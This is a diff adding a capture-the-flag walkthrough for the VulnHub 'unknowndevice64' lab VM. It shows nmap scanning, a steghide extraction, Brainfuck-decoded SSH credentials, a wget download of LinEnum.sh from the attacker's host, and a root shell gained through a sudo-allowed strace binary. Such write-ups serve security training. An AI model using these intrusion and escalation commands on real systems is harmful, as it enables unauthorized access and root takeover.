@@ -1,0 +1,105 @@
+
+https://www.vulnhub.com/entry/unknowndevice64-1,293/
+
+1.nmap -A -sV -sC -p- --script=vuln -oN nmap_full1.txt 192.168.64.183
+port 1337 and  31337 were open
+
+2.open http://192.168.64.183:31337
+Check source ,you will find key_is_h1dd3n.jpg
+
+3.http://192.168.64.183:31337/key_is_h1dd3n.jpg
+	Download this image.
+4.Now i tried using different stego tools.
+	and got steghide working 
+	: steghide --extract  -sf key_is_h1dd3n.jpg
+	got passphrase just by guessing.
+	which is : h1dd3n
+5.wrote extracted data to "h1dd3n.txt".
+Now by searching some time about ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.-----------------.<----------------.--.++++++.---------.>-----------------------.<<+++.++.>+++++.--.++++++++++++.>++++++++++++++++++++++++++++++++++++++++.-----------------.
+
+got to know that it is brain fuck programming language.
+ 
+6. use any online tool for running the code ,i used https://www.splitbrain.org/_static/ook/
+got : ud64:1M!#64@ud
+
+7.ssh ud64@192.168.64.183 -p 1337
+ violla got user shell!
+
+ 8.Now we need to esclate to root
+ So for this i will be using Linenum.sh 
+ It is a powerful enumeration script
+
+9.I started a server from the my machine to transfer Linsenum.sh to target 
+	: python -m SimpleHTTPServer 80
+Then used wget to download file on the target :wget http://192.168.64.181/LinEnum.sh
+
+10.we need to change permissions of the script via : chmod +x LinEnum.sh
+User ud64 may run the following commands on unknowndevice64_v1:
+    (ALL) NOPASSWD: /usr/bin/sysud64
+
+11. so user can run sudo /usr/bin/sysud64
+After running this i got to know that it is a strace utility used for debuuging processes.
+So after little bit of searching i got to know we can use his for getting a shell and it will be a root shell as it is running as sudo.
+:sudo  /usr/bin/sysud64 -o/dev/null /bin/bash
+
+And BOOM! we are root now.
+
+12.
+I quickly went to root directory for root.txt
+FYI use vi for opening flag.
+  ___    _                _
+ / _ \  | |              | |
+/ /_\ \ | |__   __ _  ___| | _____ _ __
+|  _  | | '_ \ / _` |/ __| |/ / _ \ '__|
+| | | | | | | | (_| | (__|   <  __/ |
+\_| |_/ |_| |_|\__,_|\___|_|\_\___|_|
+
+
+     _                    __             _
+    | |                  / _|           | |
+  __| | ___   ___  ___  | |_ ___  _ __  | | _____   _____
+ / _` |/ _ \ / _ \/ __| |  _/ _ \| '__| | |/ _ \ \ / / _ \
+| (_| | (_) |  __/\__ \ | || (_) | |    | | (_) \ V /  __/
+ \__,_|\___/ \___||___/ |_| \___/|_|    |_|\___/ \_/ \___|
+
+
+          _           _           _   _
+         | |         | |         | | | |
+__      _| |__   __ _| |_    ___ | |_| |__   ___ _ __ ___
+\ \ /\ / / '_ \ / _` | __|  / _ \| __| '_ \ / _ \ '__/ __|
+ \ V  V /| | | | (_| | |_  | (_) | |_| | | |  __/ |  \__ \
+  \_/\_/ |_| |_|\__,_|\__|  \___/ \__|_| |_|\___|_|  |___/
+
+
+                     _     _               _         _
+                    | |   | |             | |       | |
+__      _____  _   _| | __| |  _ __   ___ | |_    __| | ___
+\ \ /\ / / _ \| | | | |/ _` | | '_ \ / _ \| __|  / _` |/ _ \
+ \ V  V / (_) | |_| | | (_| | | | | | (_) | |_  | (_| | (_) |
+  \_/\_/ \___/ \__,_|_|\__,_| |_| |_|\___/ \__|  \__,_|\___/
+
+
+  __
+ / _|
+| |_ ___  _ __   _ __ ___   ___  _ __   ___ _   _
+|  _/ _ \| '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
+| || (_) | |    | | | | | | (_) | | | |  __/ |_| |_
+|_| \___/|_|    |_| |_| |_|\___/|_| |_|\___|\__, (_)
+                                             __/ |
+                                            |___/
+
+
+
+   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _
+  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \
+ ( . | / | u | n | k | n | o | w | n | d | e | v | i | c | e | 6 | 4 )
+  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/
+
+~
+~
+~
+~
+~
+~
+
+
